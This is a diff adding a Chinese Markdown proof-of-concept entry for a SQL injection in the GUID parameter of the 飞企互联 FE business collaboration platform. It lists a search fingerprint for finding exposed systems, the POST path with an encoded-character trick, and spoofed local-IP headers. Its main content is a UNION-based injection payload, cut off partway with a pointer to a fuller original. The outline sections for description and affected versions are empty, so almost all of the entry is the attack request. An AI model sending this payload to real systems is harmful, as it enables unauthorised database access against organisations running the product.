@@ -1,0 +1,19 @@
+# 飞企互联FE业务协作平台GUID存在SQL注入漏洞
+
+- **系统**：飞企互联FE业务协作平台　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`app.name=="飞企互联 FE 6.0+"`
+- **请求**：`POST /sysform/003/editflow_manager.js%70 HTTP/1.1`
+- **关键头**：`Host: {hostname}`　`Content-Length: 49`　`Content-Type: application/x-www-form-urlencoded`　`X-Forwarded-For: 127.0.0.1`　`X-Originating-IP: 127.0.0.1`　`X-Remote-Addr: 127.0.0.1`　`X-Remote-IP: 127.0.0.1`
+
+**请求体 / payload**
+```
+option=2&GUID=1%27+UNION+ALL+SELECT+CHAR%28113%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%2884%29%2BCHAR%2865%29%2BCHAR%28102%29%2BCHAR%28107%29%2BCHAR%28108%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%2865%29%2BCHAR%2869%29%2BCHAR%2872%29%2BCHAR%28100%29%2BCHAR%28103%29%2BCHAR%2888%29%2BCHAR%28113%29%2BCHAR%2884%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%2870%29%2BCHAR%28115%29%2BCHAR%2868%29%2BCHAR%2886%29%2BCHAR%2880%29%2BCHAR%28114%29%2BCHAR%2882%29%2BCHAR%28103%29%2BCHAR%28105%29%2BCHAR%28108%29%2BCHAR%28115%29%2BCHAR%28101%29%2BCHAR%2887%29%2BCHAR%2888%29%2BCHAR…（脚本共 1135 字，完整版见原文）
+```
+
+**其他**
+- 飞企互联FE业务协作平台GUID存在SQL注入漏洞: * 一、漏洞简介
+* 二、影响版本
+* 三、资产测绘
+* 四、漏洞复现
+***
+- 版本: * 飞企互联FE业务协作平台
